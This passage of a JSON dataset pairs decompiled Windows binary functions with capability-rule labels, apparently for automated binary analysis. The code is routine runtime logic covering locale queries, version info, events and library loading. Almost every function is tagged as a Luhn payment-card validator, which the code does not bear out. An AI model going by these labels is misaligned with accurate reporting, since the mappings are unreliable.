            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bd4c(int32_t arg_8h)\n\n{\n    int32_t in_EDX;\n    int32_t iVar1;\n    \n    iVar1 = 0x100 - *(arg_8h + -0x104);\n    if (in_EDX < iVar1) {\n        iVar1 = in_EDX;\n    }\n    if (iVar1 != 0) {\n        fcn.004030fc();\n    }\n    *(arg_8h + -0x104) = *(arg_8h + -0x104) + iVar1;\n    return;\n}\n",
        "token_count": 130
    },
    "0040bdac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bdac(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch._0_1_ = 0;\n    var_14h._0_1_ = 0;\n    arg_8h_00 = 1;\n    fcn.0040ab90(1, &var_20h, 4);\n    fcn.0040bd4c(arg_8h_00);\n    return;\n}\n",
        "token_count": 152
    },
    "0040c8e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c8e8(uint param_1, int32_t param_2)\n\n{\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    \n    if (param_2 == 0) {\n        fcn.0040c130(&stack0xfffffffc);\n    }\n    else {\n        fcn.0040c130(&stack0xfffffffc);\n    }\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 106
    },
    "0040cb5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040cb5c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    while( true ) {\n        uVar3 = fcn.0040580c();\n        if ((uVar3 < *param_2) || (cVar1 = *(in_EAX + -1 + *param_2),  uVar3 = cVar1 - 0x3a,  cVar1 - 0x30U < 10))\n        break;\n        uVar3 = *(in_EAX + -1 + *param_2);\n        if ((*((uVar3 >> 3) + 0x48f828) >> (uVar3 & 7) & 1) == 0) {\n            *param_2 = *param_2 + 1;\n        }\n        else {\n            iVar2 = fcn.0040e7a0();\n            *param_2 = iVar2;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 248
    },
    "0040d208": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040d208(void)\n\n{\n    char cVar1;\n    double dStack20;\n    \n    cVar1 = fcn.0040d23c();\n    if (cVar1 == '\\0') {\n        fcn.0040975c();\n    }\n    return dStack20;\n}\n",
        "token_count": 69
    },
    "0040d2d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d2d8(void)\n\n{\n    int32_t iVar1;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack276;\n    uchar *puStack272;\n    uint uStack268;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0;\n    uStack268 = 0x100;\n    puStack272 = &stack0xfffffefc;\n    uStack276 = 0;\n    uStack284 = 0;\n    uStack288 = 0x3200;\n    uStack292 = 0x40d2fc;\n    for (iVar1 = sub.kernel32.dll_FormatMessageA();\n        (0 < iVar1 && (((&stack0xfffffedf)[iVar1] < 0x21 || ((&stack0xfffffedf)[iVar1] == 0x2e)))); iVar1 = iVar1 + -1)\n    {\n    }\n    uStack292 = 0x40d31c;\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 238
    },
    "0040d324": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d324(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (iVar1 < 1) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405620();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "0040d3d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040d3d8(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = 0;\n    uStack48 = 0x40d4eb;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = sub.kernel32.dll_GetThreadLocale_1();\n    iVar1 = 1;\n    do {\n        fcn.0040d39c(&var_ch, 0xb, &stack0xfffffffc);\n        fcn.00405584();\n        fcn.0040d39c(&var_10h, 0xb, &stack0xfffffffc);\n        fcn.00405584();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0xd);\n    iVar1 = 1;\n    do {\n        var_8h = (iVar1 + 5) % 7;\n        fcn.0040d39c(&var_14h, 6, &stack0xfffffffc);\n        fcn.00405584();\n        fcn.0040d39c(&var_18h, 6, &stack0xfffffffc);\n        fcn.00405584();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 8);\n    *in_FS_OFFSET = uStack52;\n    fcn.00405554(0x40d4f2);\n    return;\n}\n",
        "token_count": 439
    },
    "0040d5b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d5b0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    code **in_FS_OFFSET;\n    code *in_stack_ffffffc4;\n    code *pcStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack20 = 0x40d647;\n    pcStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &pcStack24;\n    puVar3 = &var_4h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040d324(puVar3);\n    iVar1 = fcn.00409f08();\n    if (iVar1 - 3U < 3) {\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 4);\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040d4fc, uVar2);\n        iVar4 = 7;\n        puVar3 = 0x4958f4;\n        do {\n            *puVar3 = 0xffffffff;\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 3);\n        in_stack_ffffffc4 = fcn.0040d538;\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040d538, uVar2);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.00405530(0x40d64e);\n    return;\n}\n",
        "token_count": 402
    },
    "0040d89c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d89c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_EDX;\n    uint var_458h;\n    uint *var_358h;\n    uint var_354h;\n    uint *var_350h;\n    uint var_34ch;\n    int32_t var_348h;\n    uint var_344h;\n    int32_t var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    int32_t var_32ch;\n    int32_t var_320h;\n    uint var_312h;\n    uint var_212h;\n    uint var_10dh;\n    int32_t var_8h;\n    uint var_4h;\n    \n    sub.kernel32.dll_VirtualQuery_1();\n    if (var_320h == 0x1000) {\n        iVar3 = var_32ch;\n        iVar2 = sub.kernel32.dll_GetModuleFileNameA_1(var_32ch, &var_212h, 0x105);\n        if (iVar2 != 0) {\n            var_8h = in_EDX - var_32ch;\n            goto code_r0x0040d912;\n        }\n    }\n    iVar3 = *0x4957f8;\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    var_8h = fcn.0040d890();\ncode_r0x0040d912:\n    fcn.0040ea28(iVar3);\n    fcn.0040a8e4();\n    var_340h = 0x40da1c;\n    var_338h = 0x40da1c;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        var_340h = fcn.004059dc();\n        iVar3 = fcn.0040a858();\n        if ((iVar3 != 0) && (*(var_340h + -1 + iVar3) != '.')) {\n            var_338h = 0x40da20;\n        }\n    }\n    uVar4 = fcn.00406a10(*(*0x492794 + 4), &var_312h, 0x100);\n    sub.user32.dll_LoadStringA_1(uVar4);\n    fcn.00404530();\n    var_358h = &var_458h;\n    var_354h._0_1_ = 4;\n    var_350h = &var_10dh;\n    var_34ch._0_1_ = 6;\n    var_348h = var_8h;\n    var_344h._0_1_ = 5;\n    var_33ch._0_1_ = 6;\n    var_334h._0_1_ = 6;\n    fcn.0040af48(4, &var_358h);\n    fcn.0040a858();\n    return;\n}\n",
        "token_count": 693
    },
    "0040daec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040daec(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00405584();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 128
    },
    "0040db28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040db28(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack40 = 0x40db3c;\n        fcn.00404974();\n    }\n    uStack44 = 0x40db82;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h_00 = &fcn.0040db28::var_4h;\n    puStack40 = &stack0xfffffffc;\n    fcn.0040af88(arg_8h_00);\n    fcn.00405584();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack44 = 0x40db89;\n    iStack48 = 0x40db81;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 256
    },
    "0040dba8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040dba8(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00407550();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 128
    },
    "0040dbe4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dbe4(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack44 = 0x40dbfa;\n        fcn.00404974();\n    }\n    uStack48 = 0x40dc50;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    arg_8h_00 = &fcn.0040dbe4::var_4h;\n    puStack44 = &stack0xfffffffc;\n    fcn.00407550();\n    fcn.0040af88(arg_8h_00);\n    fcn.00405584();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack48 = 0x40dc57;\n    iStack52 = 0x40dc4f;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 270
    },
    "0040dc78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040dc78(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_DL = extraout_DL;\n    }\n    fcn.00405584();\n    *(in_EAX + 8) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 145
    },
    "0040ddbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040ddbc(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack56 = 0x40de58;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    if (in_EAX == 0) {\n        fcn.00407550();\n    }\n    else {\n        puStack52 = &stack0xfffffffc;\n        fcn.004055c8();\n    }\n    var_1ch = var_4h;\n    var_18h._0_1_ = 0xb;\n    var_10h._0_1_ = 0xb;\n    var_8h._0_1_ = 0;\n    arg_ch = &var_1ch;\n    arg_8h = 2;\n    var_14h = param_2;\n    fcn.00407550();\n    fcn.0040db28(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    uStack60 = 0x40de5f;\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 385
    },
    "0040de78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040de78(uint arg_8h)\n\n{\n    fcn.0040ddbc();\n    fcn.0040de68();\n    return;\n}\n",
        "token_count": 40
    },
    "0040deac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040deac(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    unkbyte3 Var3;\n    int32_t iVar2;\n    \n    iVar1 = *in_EAX;\n    Var3 = iVar1 >> 8;\n    if (iVar1 < -0x3fffff6d) {\n        iVar2 = iVar1;\n        if (iVar1 == -0x3fffff6e) {\ncode_r0x0040df10:\n            return CONCAT31(iVar2 >> 8, 6);\n        }\n        if (iVar1 < -0x3fffff71) {\n            if (iVar1 == -0x3fffff72) {\n                return CONCAT31(Var3, 7);\n            }\n            if (iVar1 == -0x3ffffffb) {\n                return 0xb;\n            }\n            if (iVar1 == -0x3fffff74) {\n                return 4;\n            }\n            iVar2 = iVar1 + 0x3fffff73;\n            if (iVar2 == 0) goto code_r0x0040df19;\n        }\n        else {\n            iVar2 = iVar1 + 0x3fffff6f;\n            if (iVar1 + 0x3fffff71U < 2) goto code_r0x0040df10;\n            if (iVar2 == 0) {\n                return 8;\n            }\n        }\n    }\n    else if (iVar1 < -0x3fffff69) {\n        if (iVar1 == -0x3fffff6a) {\n            return CONCAT31(Var3, 0xc);\n        }\n        iVar2 = iVar1 + 0x3fffff6d;\n        if (iVar2 == 0) {\ncode_r0x0040df19:\n            return CONCAT31(iVar2 >> 8, 9);\n        }\n        if (iVar1 == -0x3fffff6c) {\n            return 3;\n        }\n        iVar2 = iVar1 + 0x3fffff6b;\n        if (iVar2 == 0) {\n            return 5;\n        }\n    }\n    else {\n        if (iVar1 == -0x3fffff03) {\n            return 0xe;\n        }\n        iVar2 = iVar1 + 0x3ffffec6;\n        if (iVar2 == 0) {\n            return 0xd;\n        }\n    }\n    return CONCAT31(iVar2 >> 8, 0x16);\n}\n",
        "token_count": 550
    },
    "0040e110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e110(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x40e1c9;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_4h = in_EAX;\n    uVar2 = fcn.0040deac();\n    uVar2 = uVar2 & 0xff;\n    if (7 < uVar2 - 3) {\n        if (uVar2 == 0xb) {\n            in_stack_ffffffd4 = 0x40e167;\n            iVar3 = fcn.0040df44(&stack0xfffffffc);\n            goto code_r0x0040e19c;\n        }\n        if (9 < uVar2 - 0xc) {\n            var_ch = *var_4h;\n            var_8h._0_1_ = 0;\n            arg_ch = &fcn.0040e110::var_ch;\n            in_stack_ffffffd4 = 0;\n            fcn.00407550();\n            iVar3 = fcn.0040db28(in_stack_ffffffd4, arg_ch);\n            goto code_r0x0040e19c;\n        }\n    }\n    iVar3 = fcn.0040daec();\ncode_r0x0040e19c:\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        *(iVar3 + 0xc) = var_4h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x40e1d0;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 483
    },
    "0040e394": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get file version info"
        ],
        "decompiled_code": "\nvoid fcn.0040e394(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa0;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint pBlock;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x40e46a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    var_8h = 0xffffffff;\n    puStack48 = 0x40e3c1;\n    fcn.004055c8();\n    puStack48 = 0x40e3c9;\n    fcn.00405a34();\n    puStack48 = &fcn.0040e394::var_ch;\n    uStack52 = 0x40e3d5;\n    uStack52 = fcn.004059dc();\n    puStack56 = 0x40e3db;\n    iVar1 = sub.version.dll_GetFileVersionInfoSizeA();\n    if (iVar1 != 0) {\n        puStack56 = 0x40e3e8;\n        pBlock = fcn.00402f00();\n        uStack60 = 0x40e44d;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        uVar2 = fcn.004059dc(var_ch, iVar1, pBlock);\n        iVar1 = sub.version.dll_GetFileVersionInfoA(uVar2);\n        if (iVar1 != 0) {\n            in_stack_ffffffa0 = pBlock;\n            iVar1 = sub.version.dll_VerQueryValueA(pBlock, 0x40e47c, &fcn.0040e394::lplpBuffer, &fcn.0040e394::puLen);\n            if (iVar1 != 0) {\n                var_8h = *(lplpBuffer + 8);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        fcn.00402f1c(0x40e454);\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    uStack44 = 0x40e471;\n    puStack48 = 0x40e469;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 606
    },
    "0040ea9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ea9c(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint var_1h;\n    \n    sub.kernel32.dll_GetCPInfo(0, arg_8h + -0x14);\n    for (iVar4 = 0; (iVar4 < 0xc && ((*(arg_8h + -0xe + iVar4) | *(arg_8h + -0xd + iVar4)) != 0)); iVar4 = iVar4 + 2) {\n        var_1h._0_1_ = *(arg_8h + -0xe + iVar4);\n        uVar1 = *(arg_8h + -0xd + iVar4);\n        if (var_1h <= uVar1) {\n            cVar3 = (uVar1 - var_1h) + '\\x01';\n            do {\n                puVar2 = (var_1h >> 3) + 0x48f828;\n                *puVar2 = *puVar2 | '\\x01' << (var_1h & 7);\n                var_1h._0_1_ = var_1h + 1;\n                cVar3 = cVar3 + -1;\n            } while (cVar3 != '\\0');\n        }\n    }\n    return;\n}\n",
        "token_count": 340
    },
    "0040f224": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f224(void)\n\n{\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 36
    },
    "0040f268": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f268(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x40f2f3;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (in_EAX == 0) {\n        iVar1 = fcn.0040dba8();\n    }\n    else {\n        var_ch._0_1_ = 0;\n        puStack32 = &stack0xfffffffc;\n        fcn.0040d2d8();\n        var_8h = 0;\n        var_4h._0_1_ = 0xb;\n        in_stack_ffffffd0 = 1;\n        iVar1 = fcn.0040dbe4(1, &var_10h);\n    }\n    *(iVar1 + 0xc) = in_EAX;\n    fcn.00404ec4();\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x40f2fa;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 332
    },
    "0040f660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040f660(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 0xc) = 0xffff;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0xffffffff, 0);\n    *(in_EAX + 0x10) = uVar1;\n    uVar2 = 0;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n    *(in_EAX + 0x14) = uVar1;\n    *(in_EAX + 0x18) = 0xffffffff;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x20) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 287
    },
    "0040fa00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040fa00(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x40fa0f;\n    uStack24 = param_2;\n    sub.kernel32.dll_SetErrorMode();\n    uStack32 = 0x40fa72;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x40fa54;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc();\n    sub.kernel32.dll_LoadLibraryA();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 249
    },
    "00410e48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410e48(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x410ed7;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415d0c();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.00415d0c();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.00407550();\n    fcn.0040db28(arg_8h, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x410ede;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 305
    },
    "00410f38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410f38(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x410fc7;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415d0c();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.00415d0c();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.00407550();\n    fcn.0040db28(arg_8h, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x410fce;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 305
    },
    "004113a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004113a8(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "004113d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
